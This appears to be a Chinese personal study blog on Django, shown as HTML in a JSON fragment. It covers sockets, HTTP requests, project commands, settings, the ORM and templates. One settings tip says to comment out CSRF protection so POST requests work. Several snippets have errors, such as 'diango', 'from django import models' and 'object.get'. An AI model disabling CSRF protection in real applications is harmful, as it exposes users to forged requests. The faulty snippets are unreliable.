class=\"name\">th</span>&gt;</span>序号<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>id<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>name<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">        &#123;% for i in p_list %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; forloop.counter &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; i.id &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>&#123;&#123; i.name &#125;&#125;<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">        &#123;% endfor %&#125;</span><br><span class=\"line\">        <span class=\"tag\">&lt;/<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">table</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;lists.html&#x27;</span>, context=&#123;<span class=\"string\">&#x27;p_list&#x27;</span>: lists&#125;)</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"Django相关的命令\"><a href=\"#Django相关的命令\" class=\"headerlink\" title=\"Django相关的命令\"></a>Django相关的命令</h4><h5 id=\"1-下载安装\"><a href=\"#1-下载安装\" class=\"headerlink\" title=\"1.下载安装\"></a>1.下载安装</h5><p><code>Pip3 install diango</code>创建 diango项目</p>\n<p><code>django-admin startproject</code>项目名称 启动项目</p>\n<h6 id=\"切换到项目的根目录\"><a href=\"#切换到项目的根目录\" class=\"headerlink\" title=\"切换到项目的根目录\"></a>切换到项目的根目录</h6><p><code>python3 manage. py runserver [127.0.0.1[:8000]]</code>运行服务</p>\n<h6 id=\"创建app-1\"><a href=\"#创建app-1\" class=\"headerlink\" title=\"创建app\"></a>创建app</h6><p><code>python3 manage. py startapp app</code>    名称 数据库迁移的命令</p>\n<p><code>python manage. py makemigrations</code> 检测app下的 model.py的变化记录下变更记录 </p>\n<p><code>python manage. py migrate</code> 迁移将变更记录同步到数据库中</p>\n<h5 id=\"2-settings配置\"><a href=\"#2-settings配置\" class=\"headerlink\" title=\"2.settings配置\"></a>2.settings配置</h5><p>​    BASE_DIR 项目的根目录</p>\n<p>​    INSTALLED_APPS 注册的app</p>\n<p>​    MIDDLEWARE 中间件</p>\n<p>​        注释CSRF保护,可以提交POST请求</p>\n<p>​    TEMPLATES模板</p>\n<p>​        DIRS: [os.path.join(BASE_DIR, ‘templates’)] </p>\n<p>​    静态文件</p>\n<p>​        STATIC_URL = ‘/static/‘ 静态文件的别名</p>\n<p>​        STATICFILES_DIRS = [</p>\n<p>BASE_DIR, ‘static’)                </p>\n<p>​                ]</p>\n<h5 id=\"3-django使用mysql\"><a href=\"#3-django使用mysql\" class=\"headerlink\" title=\"3.django使用mysql\"></a>3.django使用mysql</h5><h6 id=\"1-创建mysql数据库\"><a href=\"#1-创建mysql数据库\" class=\"headerlink\" title=\"1.创建mysql数据库\"></a>1.创建mysql数据库</h6><h6 id=\"2-配置settings\"><a href=\"#2-配置settings\" class=\"headerlink\" title=\"2.配置settings\"></a>2.配置settings</h6><p>​            </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">DATABASES</span><br><span class=\"line\">ENGINE django.db.backends.mysql</span><br><span class=\"line\">NAME 数据库名</span><br><span class=\"line\">HOST IP地址</span><br><span class=\"line\">PORT <span class=\"number\">3306</span></span><br><span class=\"line\">USER 用户名</span><br><span class=\"line\">PASSWORD 密码</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"3-使用pymysql模块连接mysql数据库\"><a href=\"#3-使用pymysql模块连接mysql数据库\" class=\"headerlink\" title=\"3.使用pymysql模块连接mysql数据库\"></a>3.使用pymysql模块连接mysql数据库</h6><p>建议写在__init__.py中</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pymysql</span><br><span class=\"line\">pymysql.install_as_MySQLdb()</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"4-在app的models-py写入model-models-model\"><a href=\"#4-在app的models-py写入model-models-model\" class=\"headerlink\" title=\"4.在app的models.py写入model(models.model)\"></a>4.在app的models.py写入model(models.model)</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from django import models</span><br><span class=\"line\">class User(models.Model):</span><br><span class=\"line\">\tusername &#x3D; models.CharField(max_length&#x3D;32)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"5-迁移至数据库\"><a href=\"#5-迁移至数据库\" class=\"headerlink\" title=\"5.迁移至数据库\"></a>5.迁移至数据库</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 manage.py makemigrations</span><br><span class=\"line\">python3 manage.py migrate</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"4-urls-py-路径与函数对应关系\"><a href=\"#4-urls-py-路径与函数对应关系\" class=\"headerlink\" title=\"4.urls.py 路径与函数对应关系\"></a>4.urls.py 路径与函数对应关系</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> views</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;list/&#x27;</span>, views.p_list),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;create/&#x27;</span>, views.create),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;delete/&#x27;</span>, views.delete),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;edit/&#x27;</span>, views.edit)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"5-函数\"><a href=\"#5-函数\" class=\"headerlink\" title=\"5.函数\"></a>5.函数</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">xxx</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">\trequest.method  <span class=\"comment\"># 请求方式</span></span><br><span class=\"line\">\trequest.POST  <span class=\"comment\"># post传输的参数</span></span><br><span class=\"line\">  <span class=\"keyword\">return</span></span><br><span class=\"line\">\t<span class=\"comment\"># render(request, &#x27;login.html&#x27;, context=&#123;&#x27;info&#x27;: &#x27;Success&#x27;&#125;)  渲染并返回HTML页面</span></span><br><span class=\"line\">  <span class=\"comment\"># HttpResponse(&#x27;字符串&#x27;)</span></span><br><span class=\"line\">  <span class=\"comment\"># redirect(&#x27;/index&#x27;) </span></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"6-ORM\"><a href=\"#6-ORM\" class=\"headerlink\" title=\"6.ORM\"></a>6.ORM</h5><p>对象关系映射</p>\n<p>类 -&gt; 表</p>\n<p>对象 -&gt; 数据行</p>\n<p>属性 -&gt; 字段</p>\n<h6 id=\"查询\"><a href=\"#查询\" class=\"headerlink\" title=\"查询\"></a>查询</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> models</span><br><span class=\"line\">models.User.objects.<span class=\"built_in\">all</span>()</span><br><span class=\"line\">models.User.<span class=\"built_in\">object</span>.get(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>)</span><br><span class=\"line\">models.User.<span class=\"built_in\">object</span>.<span class=\"built_in\">filter</span>(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>,name=<span class=\"string\">&#x27;x&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"增加\"><a href=\"#增加\" class=\"headerlink\" title=\"增加\"></a>增加</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">models.User.objects.create(name=<span class=\"string\">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"删除\"><a href=\"#删除\" class=\"headerlink\" title=\"删除\"></a>删除</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">models.User.objects.get(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>).delete()</span><br><span class=\"line\">models.User.objects.<span class=\"built_in\">filter</span>(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>).delete()</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"修改\"><a href=\"#修改\" class=\"headerlink\" title=\"修改\"></a>修改</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">obj = models.User.objects.get(<span class=\"built_in\">id</span>=<span class=\"number\">1</span>)</span><br><span class=\"line\">obj.name = <span class=\"string\">&#x27;xxx&#x27;</span></span><br><span class=\"line\">obj.save()</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"7-模版语法\"><a href=\"#7-模版语法\" class=\"headerlink\" title=\"7.模版语法\"></a>7.模版语法</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">return render(request, &#39;filename.html&#39;, context&#x3D;&#123;&#39;k&#39;:&#39;1&#39;&#125;)</span><br><span class=\"line\">返回并渲染一个html页面</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;  k1  &#125;&#125;  # 替换内容</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;%  for i in K  %&#125;</span><br><span class=\"line\">\t&#123;&#123;  forloop.counter. &#125;&#125;</span><br><span class=\"line\">\t&#123;&#123; i.name  &#125;&#125;</span><br><span class=\"line\">&#123;%  endfor  %&#125;</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"django学习\"><a href=\"#django学习\" class=\"headerlink\" title=\"django学习\"></a>django学习</h1><h4 id=\"Web基本概念——前置\"><a href=\"#Web基本概念——前置\" class=\"headerlink\" title=\"Web基本概念——前置\"></a>Web基本概念——前置</h4><h5 id=\"socket-套接字\"><a href=\"#socket-套接字\" class=\"headerlink\" title=\"socket 套接字\"></a>socket 套接字</h5><p>位于应用层与传输层之间的虚拟层,通过此接口进行数据传输等操作</p>\n<h5 id=\"c-s-架构\"><a href=\"#c-s-架构\" class=\"headerlink\" title=\"c/s 架构\"></a>c/s 架构</h5><p>即client/server架构,通过客户端程序与服务端通信</p>\n<h5 id=\"b-s-架构\"><a href=\"#b-s-架构\" class=\"headerlink\" title=\"b/s 架构\"></a>b/s 架构</h5><p>即browser/server架构,通过浏览器发送http请求,获得服务器的资源</p>\n<p>便捷、通用</p>\n<h5 id=\"请求过程\"><a href=\"#请求过程\" class=\"headerlink\" title=\"请求过程\"></a>请求过程</h5><h6 id=\"0-socket服务端-绑定-监听\"><a href=\"#0-socket服务端-绑定-监听\" class=\"headerlink\" title=\"0.socket服务端 绑定/监听\"></a>0.socket服务端 绑定/监听</h6><p>​    0.0 导入socket库</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br></pre></td></tr></table></figure>\n\n<p>​    0.1 创建socket服务端     </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\"><span class=\"comment\"># socket.AF_INET 表示使用ipv4</span></span><br><span class=\"line\"><span class=\"comment\"># socket.SOCK_STREAM 表示使用tcp</span></span><br></pre></td></tr></table></figure>\n\n<p>​    0.2 绑定到本地端口</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socket.bind((<span class=\"string\">&#x27;127.0.0.1&#x27;</span>,<span class=\"number\">8080</span>))</span><br><span class=\"line\"><span class=\"comment\"># target与port要以元组的形势传入</span></span><br></pre></td></tr></table></figure>\n\n<p>​    0.3 开启监听</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">socket.listen(<span class=\"number\">5</span>)</span><br><span class=\"line\"><span class=\"comment\"># 设置最大连接数</span></span><br></pre></td></tr></table></figure>\n\n<p>​    0.4 等待连接</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">\tso,addr = socket.accept()</span><br><span class=\"line\">  <span class=\"comment\"># 返回连接socket与客户端地址</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"1-socket客户端-连接\"><a href=\"#1-socket客户端-连接\" class=\"headerlink\" title=\"1.socket客户端 连接\"></a>1.socket客户端 连接</h6><p>​    0.1 创建socket客户端</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br></pre></td></tr></table></figure>\n\n<p>​    0.2 连接服务端</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">client.connect((target,port))</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"2-双方传输数据\"><a href=\"#2-双方传输数据\" class=\"headerlink\" title=\"2.双方传输数据\"></a>2.双方传输数据</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">data = server.recv(<span class=\"number\">1024</span>)</span><br><span class=\"line\">client.send(<span class=\"string\">b&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>\n\n<h6 id=\"3-处理请求、发送内容\"><a href=\"#3-处理请求、发送内容\" class=\"headerlink\" title=\"3.处理请求、发送内容\"></a>3.处理请求、发送内容</h6><h6 id=\"4-重复到-2\"><a href=\"#4-重复到-2\" class=\"headerlink\" title=\"4.重复到 2\"></a>4.重复到 2</h6><h6 id=\"5-断开连接\"><a href=\"#5-断开连接\" class=\"headerlink\" title=\"5.断开连接\"></a>5.断开连接</h6><h5 id=\"HTTP\"><a href=\"#HTTP\" class=\"headerlink\" title=\"HTTP\"></a>HTTP</h5><h6 id=\"Hyper-Text-Transfer-Protocol-超文本传输协议\"><a href=\"#Hyper-Text-Transfer-Protocol-超文本传输协议\" class=\"headerlink\" title=\"Hyper Text Transfer Protocol 超文本传输协议\"></a>Hyper Text Transfer Protocol 超文本传输协议</h6><h6 id=\"推荐书籍-《http权威指南》\"><a href=\"#推荐书籍-《http权威指南》\" class=\"headerlink\" title=\"推荐书籍:《http权威指南》\"></a>推荐书籍:《http权威指南》</h6><h6 id=\"Web中作为请求与响应的标准\"><a href=\"#Web中作为请求与响应的标准\" class=\"headerlink\" title=\"Web中作为请求与响应的标准\"></a>Web中作为请求与响应的标准</h6><p>请求: 请求行 请求头请求数据</p>\n<p><img src=\"https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001733298-201433635.jpg\"></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/</span> <span class=\"meta\">HTTP/1.1</span></span><br><span class=\"line\"><span class=\"attribute\">Host</span><span class=\"punctuation\">: </span>127.0.0.1:8800</span><br><span class=\"line\"><span class=\"attribute\">Connection</span><span class=\"punctuation\">: </span>keep-alive</span><br><span class=\"line\"><span class=\"attribute\">sec-ch-ua</span><span class=\"punctuation\">: </span>&quot;Google Chrome&quot;;v=&quot;89&quot;, &quot;Chromium&quot;;v=&quot;89&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\"><span class=\"attribute\">sec-ch-ua-mobile</span><span class=\"punctuation\">: </span>?0</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span><span class=\"punctuation\">: </span>1</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span><span class=\"punctuation\">: </span>Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36</span><br><span class=\"line\"><span class=\"attribute\">Accept</span><span class=\"punctuation\">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Site</span><span class=\"punctuation\">: </span>none</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Mode</span><span class=\"punctuation\">: </span>navigate</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-User</span><span class=\"punctuation\">: </span>?1</span><br><span class=\"line\"><span class=\"attribute\">Sec-Fetch-Dest</span><span class=\"punctuation\">: </span>document</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span><span class=\"punctuation\">: </span>gzip, deflate, br</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span><span class=\"punctuation\">: </span>zh-CN,zh;q=0.9</span><br><span class=\"line\"><span class=\"attribute\">Cookie</span><span class=\"punctuation\">: </span>hblid=LXa5cZvOpVbu5wDe3m39N0HIgrB8BFbo; csrftoken=NQ2jvGjSCUXBQsAU0TgOCoop939FrKCBhyPS7jAgHBlTEtpqgLOvOjZqirQ0gjeQ; security_level=0</span><br><span class=\"line\">\\r\\n</span><br></pre></td></tr></table></figure>\n\n<p>响应: 状态行 响应头部 响应数据</p>\n<p><img src=\"https://images2018.cnblogs.com/blog/867021/201803/867021-20180322001744323-654009411.jpg\"></p>\n<h6 id=\"http默认端口80-https默认端口443\"><a href=\"#http默认端口80-https默认端口443\" class=\"headerlink\" title=\"http默认端口80,https默认端口443\"></a>http默认端口80,https默认端口443</h6><h6 id=\"响应码\"><a href=\"#响应码\" class=\"headerlink\" title=\"响应码\"></a>响应码</h6><p>1xx消息 请求已被服务器接收,继续处理</p>\n<p>2xx成功 请求已成功被服务器接收、理解并接受</p>\n<p>​    200 成功</p>\n<p>3xx重定向 需要后续操作才能完成此请求</p>\n<p>4xx请求错误 客户端请求含有错误或无法执行</p>\n<p>​    403 客户端访问权限不足</p>\n<p>​    404 客户端请求资源不存在</p>\n<p>5xx服务器错误 服务器在处理正确请求时发生错误</p>\n<h6 id=\"请求方法\"><a href=\"#请求方法\" class=\"headerlink\" title=\"请求方法\"></a>请求方法</h6><p>GET、HEAD、POST、PUT、DELETE、TRACE、OPTIONS、CONNECT</p>\n<h6 id=\"URL\"><a href=\"#URL\" class=\"headerlink\" title=\"URL\"></a>URL</h6><p>统一资源定位符,用于从互联网获取信息</p>\n<p><em>Protocol://Domain:Port/Path?Key1=Value1#Part</em></p>\n<h4 id=\"django——正文\"><a href=\"#django——正文\" class=\"headerlink\" title=\"django——正文\"></a>django——正文</h4><h5 id=\"下载\"><a href=\"#下载\" class=\"headerlink\" title=\"下载\"></a>下载</h5><p><code>pip3 install django -i https://pypi.tsinghua.edu.cn/simple</code></p>\n<h5 id=\"创建项目\"><a href=\"#创建项目\" class=\"headerlink\" title=\"创建项目\"></a>创建项目</h5><p><code>django-admin startproject PROJECT_NAME</code></p>\n<p>或在professional pycharm中创建Django项目</p>\n<p><a href=\"%E9%9C%80%E8%A6%81%E5%9C%A8settings%E4%B8%AD%E6%9B%B4%E6%94%B9DIRS%E8%B7%AF%E5%BE%84(Template)\">^注意</a>: pycharm创建django3项目时,需要在settings.py中加上import os</p>\n<h5 id=\"项目目录\"><a href=\"#项目目录\" class=\"headerlink\" title=\"项目目录\"></a>项目目录</h5><h5 id=\"──-djangoStudy-项目文件夹\"><a href=\"#──-djangoStudy-项目文件夹\" class=\"headerlink\" title=\"|── djangoStudy  项目文件夹\"></a>|── djangoStudy  项目文件夹</h5><h5 id=\"│-──-init-py\"><a href=\"#│-──-init-py\" class=\"headerlink\" title=\"│    |── init.py\"></a>│    |── <strong>init</strong>.py</h5><p>│    |── asgi.py<br>│    |── settings.py 配置<br>│    |── urls.py 路由 -&gt; URL和函数的对应关系<br> |     |── wsgi.py runserver命令使用wsgiref模块当作简单的webserver<br> |── manage.py<br> |── templates</p>\n<h5 id=\"启动项目\"><a href=\"#启动项目\" class=\"headerlink\" title=\"启动项目\"></a>启动项目</h5><p><code>python3 manage.py runserver [[ip:]port]</code></p>\n<p>Pycharm执行manage.py</p>\n<h5 id=\"编写页面\"><a href=\"#编写页面\" class=\"headerlink\" title=\"编写页面\"></a>编写页面</h5><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> HttpResponse, render</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">index</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># return HttpResponse(&#x27;index&#x27;) # 返回字符串</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> render(request, <span class=\"string\">&#x27;index.html&#x27;</span>)  <span class=\"comment\"># 返回页面</span></span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;index/&#x27;</span>, index),</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"逻辑处理\"><a href=\"#逻辑处理\" class=\"headerlink\" title=\"逻辑处理\"></a>逻辑处理</h5><h6 id=\"request类\"><a href=\"#request类\" class=\"headerlink\" title=\"request类\"></a>request类</h6><p><em>METHOD</em> 请求方法</p>\n<p>​    <em>GET&amp;POST</em></p>\n<p><em>GET字典&amp;POST字典</em></p>\n<p>​    <code>POST.get(&#39;Key&#39;) </code>获得提交的参数</p>\n<h6 id=\"redirect类\"><a href=\"#redirect类\" class=\"headerlink\" title=\"redirect类\"></a>redirect类</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> django.shortcuts <span class=\"keyword\">import</span> redirect</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">login</span>(<span class=\"params\">request</span>):</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">return</span> redirect(PATH)</span><br></pre></td></tr></table></figure>\n\n<p>重定向</p>\n<h5 id=\"创建app\"><a href=\"#创建app\" class=\"headerlink\" title=\"创建app\"></a>创建app</h5><h6 id=\"生成app\"><a href=\"#生成app\" class=\"headerlink\" title=\"生成app\"></a>生成app</h6><p><code>django-admin startapp APP_NAME</code></p>\n<p>.<br> |── <strong>init</strong>.py<br> |── admin.py 管理后台<br> |── apps.py app<br> |── migrations<br> |    |── <strong>init</strong>.py<br> |── models.py 数据库<br> |── tests.py<br> |── views.py 函数</p>\n<h6 id=\"安装-注册-app\"><a href=\"#安装-注册-app\" class=\"headerlink\" title=\"安装(注册)app\"></a>安装(注册)app</h6><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">INSTALLED_APPS = [</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.auth&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.contenttypes&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.sessions&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.messages&#x27;</span>,</span><br><span class=\"line\">    <span class=\"string\">&#x27;django.contrib.staticfiles&#x27;</span>,</span><br><span class=\"line\">    <span class=\"comment\"># &#x27;app1&#x27;,</span></span><br><span class=\"line\">    <span class=\"string\">&#x27;app1.apps.App1Config&#x27;</span>,  <span class=\"comment\"># 推荐</span></span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"app使用\"><a href=\"#app使用\" class=\"headerlink\" title=\"app使用\"></a>app使用</h5><h6 id=\"views-py\"><a href=\"#views-py\" class=\"headerlink\" title=\"views.py\"></a>views.py</h6><p>将函数放在此文件内</p>\n<p>同时更改urls.py</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> app1 <span class=\"keyword\">import</span> views</span><br><span class=\"line\">urlpatterns = [</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;admin/&#x27;</span>, admin.site.urls),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;login/&#x27;</span>, views.login),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;login2/&#x27;</span>, views),</span><br><span class=\"line\">    path(<span class=\"string\">&#x27;index/&#x27;</span>, views.index)</span><br><span class=\"line\">]</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"models-py\"><a href=\"#models-py\" class=\"headerlink\" 